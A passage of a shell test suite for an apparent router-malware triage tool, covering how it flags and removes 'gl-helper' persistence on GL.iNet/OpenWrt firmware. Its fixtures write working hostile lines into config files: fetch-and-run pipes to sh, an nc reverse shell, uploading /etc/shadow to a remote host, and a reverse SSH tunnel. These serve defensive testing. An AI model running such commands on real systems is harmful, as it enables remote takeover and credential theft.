expect "the netstat wrapper is named for what it is" 'grep -A1 "IOC  *applet-hijack  */bin/netstat" "$D/check.txt" | grep -q "hides lines"'
expect "the malware's line in a crontab file of the firmware is an IOC, a file without one is not" 'grep -q "IOC  *cron-ref  */etc/gl_crontabs/crontabs.d/tasks" "$D/check.txt" && ! grep -q "crontabs.d/clean" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix removes the fallback directory with the malware, leaves the other" '[ ! -e "$D/m/etc/gl_nas/.cache" ] && [ -f "$D/m/userdata/.gl/my-notes" ]'
expect "--fix strips only the malware's lines from crontab and authorized_keys" 'grep -q own-job "$D/m/tmp/gl_crontabs/root" && ! grep -q watch.sh "$D/m/tmp/gl_crontabs/root" && grep -q AAAAOWNER "$D/m/etc/dropbear/authorized_keys" && ! grep -q gl-agent "$D/m/etc/dropbear/authorized_keys"'
expect "--fix strips only the malware's line from the firmware's crontab file" 'grep -q gl-own-task "$D/m/etc/gl_crontabs/crontabs.d/tasks" && ! grep -q watch.sh "$D/m/etc/gl_crontabs/crontabs.d/tasks" && grep -q other-task "$D/m/etc/gl_crontabs/crontabs.d/clean"'
expect "--fix leaves rtty_conf alone, says so and ends incomplete (exit $rc, issue 22)" '[ $rc = 3 ] && grep -q "65.20.71.131" "$D/m/etc/rtty_conf" && grep -q "rtty_conf still names" "$D/fix.txt" && grep -q "Verdict: remediation INCOMPLETE" "$D/fix.txt" && ! grep -q "no gl-helper indicators left" "$D/fix.txt"'
umount "$D/m"

echo "=== rtty_conf alone, as GL.iNet's cleanup can leave it (issue 22)"
D=$(mkscen rtty "$OWL"); U=$D/u
mkdir -p "$U/etc"; printf 'host 65.20.71.131\nport 5912\n' >"$U/etc/rtty_conf"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "IOC, verdict INFECTED, and the result does not promise that --fix removes it (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *rtty-server  */etc/rtty_conf" "$D/check.txt" && grep -q "Verdict: INFECTED" "$D/check.txt" && grep -q "rtty-server: --fix does NOT change /etc/rtty_conf" "$D/check.txt" && ! grep -qF -- "--fix removes it" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix changes nothing, says why and exits 1, not 0 (exit $rc)" '[ $rc = 1 ] && grep -q "65.20.71.131" "$D/m/etc/rtty_conf" && grep -q "Nothing was changed" "$D/fix.txt" && grep -q "rtty_conf still names" "$D/fix.txt" && ! grep -q "No IOC found" "$D/fix.txt"'
umount "$D/m"

echo "=== a server of the malware: what a line does with it decides (issue 20)"
# An owner who blocks the servers names them as well. A block is INFO and stays, a name
# alone is REVIEW and stays, and only a line that fetches from a server is the malware.
D=$(mkscen srvblock "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/etc/uci-defaults"
printf '#!/bin/sh\n# block 65.20.71.131 and 66.245.219.252 (CSA-2026-01)\niptables -I OUTPUT -d 65.20.71.131 -j DROP\niptables -I OUTPUT -d 66.245.219.252 -j REJECT\nip route add blackhole 65.20.71.131\nnft add rule inet fw4 output ip daddr 66.245.219.252 drop\n' >"$U/etc/hotplug.d/iface/99-block-csa"
printf '#!/bin/sh\necho "0.0.0.0 gl-inet.top" >>/etc/hosts\n' >"$U/etc/uci-defaults/99-null-host"
printf '#!/bin/sh\nping -c 1 gl-inet.top >/tmp/top.log\n# wget http://65.20.71.131:8000/ni.sh, as in the forum\n' >"$U/etc/init.d/zz-watch"
printf '# my own\n/root/start-vpn.sh\niptables -I OUTPUT -d 66.245.219.252 -j DROP\nexit 0\n' >"$U/etc/rc.local"
echo '0 4 * * * /root/backup.sh' >"$U/etc/crontabs/root"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "blocks are INFO server-block, a name alone REVIEW server-ref, no IOC (exit $rc)" '[ $rc = 0 ] && grep -q "INFO  *server-block  */etc/hotplug.d/iface/99-block-csa" "$D/check.txt" && grep -q "INFO  *server-block  */etc/uci-defaults/99-null-host" "$D/check.txt" && grep -q "REVIEW  *server-ref  */etc/init.d/zz-watch" "$D/check.txt" && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
expect "a block in rc.local is said on its PERSIST line" 'grep -A1 "PERSIST  *persistence  */etc/rc.local" "$D/check.txt" | grep -q "blocks a server of the malware (66.245.219.252)"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix leaves the block script, rc.local and the crontab as they are (exit $rc)" '[ $rc = 0 ] && [ -f "$D/m/etc/hotplug.d/iface/99-block-csa" ] && [ -f "$D/m/etc/init.d/zz-watch" ] && grep -q start-vpn "$D/m/etc/rc.local" && grep -q backup.sh "$D/m/etc/crontabs/root"'
umount "$D/m"

D=$(mkscen srvfetch "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/tmp/gl_crontabs" "$U/etc/gl_crontabs/crontabs.d"
printf 'wget -qO- http://65.20.71.131:8000/ni.sh | sh\nexit 0\n' >"$U/etc/rc.local"
echo '*/3 * * * * curl -s http://gl-inet.top:8899/x | sh' >"$U/etc/crontabs/root"
printf '#!/bin/sh\niptables -I OUTPUT -d 65.20.71.131 -j DROP; uclient-fetch -O /tmp/x http://66.245.219.252:8000/n5\n' >"$U/etc/hotplug.d/iface/98-both"
printf '#!/bin/sh\nH=65.20.71.131\nwget -O /tmp/x "http://$H:8000/ni.sh"\n' >"$U/etc/init.d/zz-indirect"
printf '0 4 * * * /usr/bin/own-job\n*/3 * * * * wget -qO- http://gl-inet.top:8899/w | sh\n' >"$U/tmp/gl_crontabs/root"
printf '30 3 * * * /usr/bin/gl-own-task\n*/5 * * * * rtty -h 65.20.71.131 -p 5912 -a\n' >"$U/etc/gl_crontabs/crontabs.d/tasks"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a fetch from a server in rc.local and the root crontab is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "fetches from a server of the malware (65.20.71.131)" && grep -A1 "IOC  *persist-ref  */etc/crontabs/root" "$D/check.txt" | grep -q "gl-inet.top"'
expect "a line that blocks and fetches counts as fetching" 'grep -q "IOC  *persist-ref  */etc/hotplug.d/iface/98-both" "$D/check.txt"'
expect "fetch lines in the firmware's crontabs are IOC cron-ref" 'grep -q "IOC  *cron-ref  */tmp/gl_crontabs/root" "$D/check.txt" && grep -q "IOC  *cron-ref  */etc/gl_crontabs/crontabs.d/tasks" "$D/check.txt"'
expect "a server named in a variable is REVIEW, not IOC (the limit of the line rule)" 'grep -q "REVIEW  *server-ref  */etc/init.d/zz-indirect" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix resets rc.local and the crontab and removes the fetching file (exit $rc)" '[ $rc = 2 ] && ! grep -q 65.20.71.131 "$D/m/etc/rc.local" && [ ! -e "$D/m/etc/crontabs/root" ] && [ ! -e "$D/m/etc/hotplug.d/iface/98-both" ] && [ -f "$D/m/etc/init.d/zz-indirect" ]'
expect "--fix drops only the fetch lines from the firmware's crontabs" 'grep -q own-job "$D/m/tmp/gl_crontabs/root" && ! grep -q gl-inet.top "$D/m/tmp/gl_crontabs/root" && grep -q gl-own-task "$D/m/etc/gl_crontabs/crontabs.d/tasks" && ! grep -q rtty "$D/m/etc/gl_crontabs/crontabs.d/tasks"'
umount "$D/m"

echo "=== names in comments and in this script's name are no trace (review of 2.53)"
D=$(mkscen notes "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/config"
printf '#!/bin/sh\n# block the servers of the gl-helper malware\niptables -I OUTPUT -d 65.20.71.131 -j DROP   # its wget source\n' >"$U/etc/hotplug.d/iface/99-block-csa"
printf '0 4 * * * /root/backup.sh\n0 * * * * sh /root/gl-helper-triage.sh --no-report >/tmp/triage.log 2>&1\n7 * * * * nslookup gl-inet.top 127.0.0.1 | grep -q 0.0.0.0 || sh /root/reblock.sh\n' >"$U/etc/crontabs/root"
printf '/root/gl-helper-triage.sh\n/etc/config/my-vpn\n' >"$U/etc/sysupgrade.conf"
printf '127.0.0.1 localhost\n# older backdoor (CSA-2026-01): adguardns.com, adguardns.org\n0.0.0.0 adguardns.com\n0.0.0.0 adguardns.org # blocked\n' >"$U/etc/hosts"
printf "config rule\n\toption name 'Block-adguardns.com'\n\toption dest_ip '1.2.3.4'\n\toption target 'REJECT'\n" >"$U/etc/config/firewall"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "no IOC, a clean verdict (exit $rc)" '[ $rc = 0 ] && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
expect "a block with a note about gl-helper and wget is INFO server-block" 'grep -q "INFO  *server-block  */etc/hotplug.d/iface/99-block-csa" "$D/check.txt"'
expect "a cron job that runs this script, or a || sh after a lookup, is the owner's PERSIST" 'grep -q "PERSIST  *persistence  */etc/crontabs/root" "$D/check.txt"'
expect "the older backdoor's names in a comment or a rule's name are no trace" '! grep -q "backdoor-host" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/hosts" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix changes none of it (exit $rc)" '[ $rc = 0 ] && [ -f "$D/m/etc/hotplug.d/iface/99-block-csa" ] && grep -q gl-helper-triage "$D/m/etc/crontabs/root" && grep -q gl-helper-triage "$D/m/etc/sysupgrade.conf"'
umount "$D/m"

echo "=== an empty rc.local in the firmware: every line of yours is a change (busybox grep -f)"
D=$(mkscen emptyrc "$OWL"); U=$D/u
L0=$BASE/openwrt-rom-emptyrc; cp -a "$OWL" "$L0"; : >"$L0/etc/rc.local"
mkdir -p "$U/etc"; printf '/root/start-vpn.sh\nexit 0\n' >"$U/etc/rc.local"
mount -t overlay overlay -o "lowerdir=$L0,upperdir=$D/u,workdir=$D/w" "$D/m"
run "$D" "$L0" --check >"$D/check.txt"
expect "rc.local is PERSIST, not the firmware's own lines" 'grep -q "PERSIST  *persistence  */etc/rc.local" "$D/check.txt" && ! grep -q "firmware-lines" "$D/check.txt"'
umount "$D/m"

echo "=== the firewall's start script (/etc/firewall.user)"
D=$(mkscen fwuser "$OWL"); U=$D/u
mkdir -p "$U/etc/firewall.d"
printf '# my rules\niptables -I FORWARD -s 192.168.8.50 -j ACCEPT\nwget -qO- http://65.20.71.131:8000/ni.sh | sh\n' >"$U/etc/firewall.user"
printf '/etc/config/.gl/watch.sh &\n' >"$U/etc/firewall.d/90-x"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a fetch or the malware's script there is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/firewall.user" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/firewall.d/90-x" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix removes those lines and keeps the owner's rule (exit $rc)" '[ $rc = 2 ] && grep -q "192.168.8.50" "$D/m/etc/firewall.user" && ! grep -q 65.20.71.131 "$D/m/etc/firewall.user" && ! grep -q watch.sh "$D/m/etc/firewall.d/90-x"'
umount "$D/m"

echo "=== a path or server that a command only names, a probe, a block taken away (review of 2.53)"
# The owner's guards: they remove or look for the malware's files, check that a block
# holds, block the older backdoor's names as the summary advises. None of it is a trace.
D=$(mkscen guards "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/etc/config"
printf '/root/start-vpn.sh\nrm -rf /etc/config/.gl/ /etc/glinet/.cache\niptables -I OUTPUT -d 65.20.71.131 -j DROP\niptables -I FORWARD -d openwrt-project.org -j DROP\nexit 0\n' >"$U/etc/rc.local"
printf '0 4 * * * /root/backup.sh\n*/10 * * * * pgrep -f gl-helper && logger -t csa "gl-helper is running"\n*/30 * * * * nc -z -w 3 65.20.71.131 8000 && logger -t csa "block failed"\n5 * * * * wget -q --spider http://gl-inet.top/ && logger -t csa up\n9 * * * * curl -s -o /dev/null http://66.245.219.252:8000/ || logger -t csa ok\n0 3 * * 0 sh /root/gl-helper-triage.sh --archive -o /mnt/usb/gl-helper --no-report\n' >"$U/etc/crontabs/root"
printf '#!/bin/sh\n[ -e /etc/config/.gl/gl-helper ] && logger -t csa ALERT\n/root/my-ddns.sh\n' >"$U/etc/hotplug.d/iface/99-watch"
printf '#!/bin/sh /etc/rc.common\nSTART=99\nstart() {\n  iptables -I OUTPUT -d 65.20.71.131 -j DROP\n  /usr/bin/agent -d &\n}\n' >"$U/etc/init.d/sysmon"
printf '#!/bin/sh\niptables -D OUTPUT -d 65.20.71.131 -j DROP\n' >"$U/etc/init.d/zz-unblock"
printf "config rule\n\toption name 'Block-backdoor'\n\toption src 'lan'\n\toption dest 'wan'\n\toption dest_ip 'adguardns.com'\n\toption target 'REJECT'\n" >"$U/etc/config/firewall"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "no IOC, a clean verdict (exit $rc)" '[ $rc = 0 ] && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
expect "rc.local and the crontab are PERSIST and say that they only name a path" 'grep -A1 "PERSIST  *persistence  */etc/rc.local" "$D/check.txt" | grep -q "names a path of the malware, but does not run it" && grep -A1 "PERSIST  *persistence  */etc/crontabs/root" "$D/check.txt" | grep -q "names a server of the malware (.*), but does not fetch from it; names a path"'
expect "a test for a file of the malware is REVIEW path-ref" 'grep -q "REVIEW  *path-ref  */etc/hotplug.d/iface/99-watch" "$D/check.txt"'
expect "a block does not hide what else a new file starts: INFO server-block and REVIEW new" 'grep -q "INFO  *server-block  */etc/init.d/sysmon" "$D/check.txt" && grep -q "REVIEW  *new  */etc/init.d/sysmon" "$D/check.txt"'
expect "taking a block away is no block: REVIEW server-ref" 'grep -q "REVIEW  *server-ref  */etc/init.d/zz-unblock" "$D/check.txt" && ! grep -q "server-block  */etc/init.d/zz-unblock" "$D/check.txt"'
expect "a firewall rule or command that blocks the older backdoor's names is INFO backdoor-block" 'grep -q "INFO  *backdoor-block  */etc/config/firewall" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/rc.local" "$D/check.txt" && ! grep -q "backdoor-host" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix changes none of it (exit $rc)" '[ $rc = 0 ] && grep -q "rm -rf /etc/config/.gl/" "$D/m/etc/rc.local" && grep -q "nc -z" "$D/m/etc/crontabs/root" && [ -f "$D/m/etc/hotplug.d/iface/99-watch" ] && [ -f "$D/m/etc/init.d/sysmon" ]'
umount "$D/m"

echo "=== what 2.52 found stays found: a continued line, more tools, a program from /tmp, a loop (review of 2.53)"
D=$(mkscen found "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/etc/uci-defaults" "$U/etc/profile.d"
printf '#!/bin/sh\nwget -q -O /tmp/gb \\\n  http://65.20.71.131:8000/gb && chmod +x /tmp/gb && /tmp/gb\n' >"$U/etc/hotplug.d/iface/99-cont"
printf '#!/bin/sh /etc/rc.common\nSTART=99\nstart() { dbclient -y -f -N -R 2222:127.0.0.1:22 u@66.245.219.252; }\n' >"$U/etc/init.d/tun"
printf '#!/bin/sh\nwget-ssl -qO /tmp/n http://gl-inet.top:8899/n; sh /tmp/n\n' >"$U/etc/uci-defaults/99-ssl"
printf 'openssl s_client -quiet -connect 66.245.219.252:8899 | /bin/sh\n' >"$U/etc/profile.d/x.sh"
printf '#!/bin/sh /etc/rc.common\nstart() {\n  procd_open_instance\n  procd_set_param command /bin/sh /etc/config/.gl/run.sh\n  procd_close_instance\n}\n' >"$U/etc/init.d/zz-procd"
printf '(while :; do /etc/glinet/.cache/gl-helper; sleep 30; done) &\nexit 0\n' >"$U/etc/rc.local"
printf '*/5 * * * * /tmp/gb 65.20.71.131 8000\n' >"$U/etc/crontabs/root"
printf '# my rules\niptables -I FORWARD -s 192.168.8.50 -j ACCEPT\nif [ -x /usr/bin/wget ]; then\n  wget -qO- http://65.20.71.131:8000/ni.sh | sh\nfi\niptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to 192.168.8.50:22\n' >"$U/etc/firewall.user"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "each is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && (for f in /etc/hotplug.d/iface/99-cont /etc/init.d/tun /etc/uci-defaults/99-ssl /etc/profile.d/x.sh /etc/init.d/zz-procd /etc/rc.local /etc/crontabs/root /etc/firewall.user; do grep -q "IOC  *persist-ref  *$f" "$D/check.txt" || exit 1; done)'
expect "the loop in rc.local starts the malware, the program from /tmp fetches" 'grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "starts the malware (/etc/glinet/.cache/gl-helper)" && grep -A1 "IOC  *persist-ref  */etc/crontabs/root" "$D/check.txt" | grep -q "fetches from a server"'
expect "the legend says that the firewall's start script is changed although it is listed for review" 'grep -q "Except the malware.s own lines in the firewall.s start script" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix: the malware's line in firewall.user becomes \":\", the script still reads as one (exit $rc)" '[ $rc = 2 ] && grep -q "^  : # line of the malware" "$D/m/etc/firewall.user" && grep -q "dport 2222" "$D/m/etc/firewall.user" && ! grep -q 65.20.71.131 "$D/m/etc/firewall.user" && env PATH="$TRIAGE_PATH" $TRIAGE_SH -n "$D/m/etc/firewall.user"'
umount "$D/m"

D=$(mkscen fwif "$OWL"); U=$D/u
mkdir -p "$U/etc"
printf '# my rules\nif wget -qO- http://65.20.71.131:8000/ni.sh | sh; then\n  iptables -I FORWARD -s 192.168.8.50 -j ACCEPT\nfi\n' >"$U/etc/firewall.user"
mnt "$D" "$OWL"
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix leaves a firewall.user that would break without the line, and says so (exit $rc)" '[ $rc = 3 ] && grep -q "if wget" "$D/m/etc/firewall.user" && grep -q "left /etc/firewall.user: without the malware.s lines it would no longer run as a script" "$D/fix.txt"'
umount "$D/m"

echo "=== a check of a block, a count, delete before insert, an ipset; uploads, redirects, a commented \\ (third review of 2.53)"
# The owner's checks: wget -qO- into /dev/null, a count of the malware's files with $( ),
# rules deleted before they are added again, an ipset of the older backdoor's names.
D=$(mkscen checks "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/config"
printf '/root/start-vpn.sh\nPID=$(pidof gl-helper) && kill $PID\niptables -I OUTPUT -d 65.20.71.131 -j DROP\nexit 0\n' >"$U/etc/rc.local"
printf '0 4 * * * /root/backup.sh\n*/30 * * * * wget -qO- -T 5 http://65.20.71.131:8000/ >/dev/null 2>&1 && logger -t csa "block failed"\n*/20 * * * * uclient-fetch -q -O - http://gl-inet.top/ >/dev/null || logger -t csa ok\n' >"$U/etc/crontabs/root"
printf '#!/bin/sh\nn=$(ls /etc/config/.gl/ 2>/dev/null | wc -l)\n[ "$n" -gt 0 ] && logger -t csa ALERT\ncommand -v gl-helper >/dev/null && killall gl-helper\n' >"$U/etc/hotplug.d/iface/99-count"
printf '#!/bin/sh\niptables -D FORWARD -d openwrt-project.org -j DROP 2>/dev/null\niptables -I FORWARD -d openwrt-project.org -j DROP\niptables -D OUTPUT -d 65.20.71.131 -j DROP 2>/dev/null\niptables -I OUTPUT -d 65.20.71.131 -j DROP\n' >"$U/etc/hotplug.d/iface/99-block"
printf "config dnsmasq\n\tlist ipset '/adguardns.com/adguardns.org/openwrt-project.org/bdblock'\n" >"$U/etc/config/dhcp"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "no IOC, a clean verdict (exit $rc)" '[ $rc = 0 ] && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
expect "pidof in \$( ), ls in \$( ) and command -v only name a path" 'grep -A1 "PERSIST  *persistence  */etc/rc.local" "$D/check.txt" | grep -q "names a path of the malware, but does not run it" && grep -q "REVIEW  *path-ref  */etc/hotplug.d/iface/99-count" "$D/check.txt"'
expect "wget -qO- and uclient-fetch -O - into /dev/null are probes" 'grep -A1 "PERSIST  *persistence  */etc/crontabs/root" "$D/check.txt" | grep -q "names a server of the malware (.*), but does not fetch from it"'
expect "delete before insert is a block, for the malware and for the older backdoor" 'grep -q "INFO  *server-block  */etc/hotplug.d/iface/99-block" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/hotplug.d/iface/99-block" "$D/check.txt"'
expect "an ipset of the older backdoor's names is INFO backdoor-block" 'grep -q "INFO  *backdoor-block  */etc/config/dhcp" "$D/check.txt" && ! grep -q "backdoor-host" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix changes none of it (exit $rc)" '[ $rc = 0 ] && grep -q "start-vpn" "$D/m/etc/rc.local" && grep -q "pidof" "$D/m/etc/rc.local" && grep -q "wget -qO-" "$D/m/etc/crontabs/root" && [ -f "$D/m/etc/hotplug.d/iface/99-count" ] && [ -f "$D/m/etc/hotplug.d/iface/99-block" ]'
umount "$D/m"

# A channel or download with its output in /dev/null, an upload, a commented \ that would
# hide the next line, and paths behind /usr/bin/nohup, timeout, sh -s < and cd.
D=$(mkscen hidden "$OWL"); U=$D/u
mkdir -p "$U/etc/hotplug.d/iface" "$U/etc/crontabs" "$U/etc/init.d" "$U/etc/uci-defaults" "$U/etc/profile.d" "$U/etc/udhcpc.user.d"
printf '#!/bin/sh /etc/rc.common\nSTART=99\nstart() { dbclient -y -f -N -R 2222:127.0.0.1:22 u@66.245.219.252 >/dev/null 2>&1; }\n' >"$U/etc/init.d/tun"
printf '#!/bin/sh\ncd /tmp && wget -q http://65.20.71.131:8000/gb >/dev/null 2>&1; chmod +x /tmp/gb; /tmp/gb &\n' >"$U/etc/hotplug.d/iface/99-gb"
printf '#!/bin/sh\nnc 65.20.71.131 8000 -e /bin/sh 2>/dev/null\n' >"$U/etc/hotplug.d/iface/99-nc"
printf '#!/bin/sh\ncurl -s -o /dev/null -d "id=$(cat /etc/machine-id)" http://65.20.71.131:8000/r\n' >"$U/etc/hotplug.d/iface/99-ping"
printf '#!/bin/sh\nwget -q -O /dev/null --post-file=/etc/shadow http://gl-inet.top:8899/u\n' >"$U/etc/uci-defaults/99-up"
printf '#!/bin/sh /etc/rc.common\nstart() {\n  logger -t net up  # wait for wan \\\n  wget -qO- http://65.20.71.131:8000/ni.sh | sh\n}\n' >"$U/etc/init.d/netcheck"
printf '#!/bin/sh /etc/rc.common\nstart() {\n  timeout -s KILL 60 /etc/config/.gl/gl-helper &\n}\n' >"$U/etc/init.d/zz-t"
printf 'sh -s < /etc/config/.gl/run.sh\n' >"$U/etc/profile.d/zz.sh"
printf '#!/bin/sh\ncd /etc/config/.gl/ && ./gb &\n' >"$U/etc/udhcpc.user.d/zz"
printf '*/5 * * * * rtty -h 65.20.71.131 -p 5912 -a >/dev/null 2>&1\n' >"$U/etc/crontabs/root"
printf '/root/start-vpn.sh  # \\\n/usr/bin/nohup /etc/glinet/.cache/gl-helper &\nexit 0\n' >"$U/etc/rc.local"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "each is IOC persist-ref (exit $rc)" '[ $rc = 1 ] && (for f in /etc/init.d/tun /etc/hotplug.d/iface/99-gb /etc/hotplug.d/iface/99-nc /etc/hotplug.d/iface/99-ping /etc/uci-defaults/99-up /etc/init.d/netcheck /etc/init.d/zz-t /etc/profile.d/zz.sh /etc/udhcpc.user.d/zz /etc/crontabs/root /etc/rc.local; do grep -q "IOC  *persist-ref  *$f" "$D/check.txt" || exit 1; done)'
expect "the line behind a commented \\ is read on its own" 'grep -A1 "IOC  *persist-ref  */etc/init.d/netcheck" "$D/check.txt" | grep -q "fetches from a server" && grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "starts the malware (/etc/glinet/.cache/gl-helper)"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix removes them (exit $rc)" '[ $rc = 2 ] && [ ! -e "$D/m/etc/init.d/tun" ] && [ ! -e "$D/m/etc/init.d/netcheck" ] && [ ! -e "$D/m/etc/hotplug.d/iface/99-ping" ] && [ ! -e "$D/m/etc/uci-defaults/99-up" ] && ! grep -q gl-helper "$D/m/etc/rc.local"'
umount "$D/m"

echo "=== a deleted rc.local, a failed archive, a run from a pipe"
D=$(mkscen wo "$OWL"); U=$D/u
mkdir -p "$U/etc/config/.gl"; echo payload >"$U/etc/config/.gl/gb"
mnt "$D" "$OWL"
rm "$D/m/etc/rc.local"
run "$D" "$OWL" --check >"$D/check.txt"
expect "a deleted rc.local is INFO deleted, not an odd file" 'grep -q "INFO  *deleted  */etc/rc.local" "$D/check.txt" && ! grep -q "odd-file" "$D/check.txt"'
run "$D" "$OWL" --fix -o /dev/null/x >"$D/fix.txt" 2>&1; rc=$?
expect "without an archive --fix changes nothing, still gives the verdict, exit 4" '[ $rc = 4 ] && grep -q "nothing was changed" "$D/fix.txt" && grep -q "Verdict: INFECTED" "$D/fix.txt" && [ -f "$D/m/etc/config/.gl/gb" ] && ! grep -q "Copy the evidence archive" "$D/fix.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix does not bring the deleted rc.local back (exit $rc)" '[ $rc = 2 ] && [ ! -e "$D/m/etc/rc.local" ]'
env PATH="$TRIAGE_PATH" $TRIAGE_SH -s -- --root "$D/m" --upper "$D/u" --lower "$OWL" --check <"$T" >"$D/pipe.txt" 2>&1
expect "run from a pipe, the head does not offer sh sh --update" 'grep -q "runs from a pipe, not a file" "$D/pipe.txt" && ! grep -q "sh sh --update" "$D/pipe.txt"'
umount "$D/m"

echo "=== rc.local with only the firmware's own lines is not a change"
D=$(mkscen rcl "$OWL"); U=$D/u
mkdir -p "$U/etc"
printf '# Put your custom commands here\n\n  . /lib/functions/gl_util.sh\n  remount_ubifs\n\nexit 0\n' >"$U/etc/rc.local"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "gl_util.sh and remount_ubifs = INFO, no PERSIST, exit 0" '[ $rc = 0 ] && grep -q "INFO  *firmware-lines  */etc/rc.local" "$D/check.txt" && grep -q "PERSIST=0" "$D/check.txt"'
echo '/root/mine.sh &' >>"$D/m/etc/rc.local"
run "$D" "$OWL" --check >"$D/check.txt"
expect "one more line of the owner's makes it PERSIST again" 'grep -q "PERSIST  *persistence  */etc/rc.local" "$D/check.txt"'
umount "$D/m"

echo "=== Tailscale from the community updater is waved through"
OWS=$BASE/openwrt-rom-ts2
cp -a "$OWL" "$OWS"; mkdir -p "$OWS/usr/sbin"; echo stock-d >"$OWS/usr/sbin/tailscaled"; echo stock-c >"$OWS/usr/sbin/tailscale"; printf '/etc/config/x\n' >"$OWS/etc/sysupgrade.conf"
D=$(mkscen tsown "$OWS"); U=$D/u
mkdir -p "$U/usr/sbin"
mnt "$D" "$OWS"
rm "$D/m/usr/sbin/tailscale" "$D/m/usr/sbin/tailscaled"; printf 'ELF 1.104.7-tcbc74fe48-tiny.by.admon.1463 more\n' >"$D/m/usr/sbin/tailscaled"; ln -s /usr/sbin/tailscaled "$D/m/usr/sbin/tailscale"
run "$D" "$OWS" --check >"$D/check.txt"; rc=$?
expect "the uncompressed build is recognised by its version string: INFO for both files" '[ $rc = 0 ] && grep -q "INFO  *updater-file  */usr/sbin/tailscaled" "$D/check.txt" && grep -q "INFO  *updater-file  */usr/sbin/tailscale$" "$D/check.txt" && ! grep -q "REVIEW.*tailscale" "$D/check.txt"'
printf 'ELF UPX! packed\n' >"$D/m/usr/sbin/tailscaled"
run "$D" "$OWS" --check >"$D/check.txt"
expect "a compressed build without the updater's traces stays REVIEW" 'grep -q "REVIEW  *modified-binary  */usr/sbin/tailscaled" "$D/check.txt"'
printf '/etc/config/x\n/usr/sbin/tailscale\n/usr/sbin/tailscaled\n' >"$D/m/etc/sysupgrade.conf"
run "$D" "$OWS" --check >"$D/check.txt"
expect "a compressed build with the updater's traces is INFO" 'grep -A1 "INFO  *updater-file  */usr/sbin/tailscaled" "$D/check.txt" | grep -q "compressed build"'
printf 'ELF something else\n' >"$D/m/usr/sbin/tailscaled"
run "$D" "$OWS" --check >"$D/check.txt"
expect "another program at that path is not waved through" 'grep -q "REVIEW  *modified-binary  */usr/sbin/tailscaled" "$D/check.txt" && ! grep -q "updater-file" "$D/check.txt"'
umount "$D/m"

echo "=== fixes from the reports: KVM netstat link alone, Tailscale in /usr/bin, linked rc.local, WireGuard timing"
OWK=$BASE/kvm-like
cp -a "$OWL" "$OWK"; mkdir -p "$OWK/usr/bin" "$OWK/etc/defaults"; ln -s busybox "$OWK/usr/bin/netstat" 2>/dev/null; echo stock >"$OWK/usr/bin/tailscaled"
printf '# stock\nexit 0\n' >"$OWK/etc/defaults/rc.local"; rm -f "$OWK/etc/rc.local"; ln -s defaults/rc.local "$OWK/etc/rc.local"
D=$(mkscen kvmfix "$OWK"); U=$D/u
mnt "$D" "$OWK"
rm "$D/m/usr/bin/netstat"; ln -s /bin/busybox "$D/m/usr/bin/netstat"
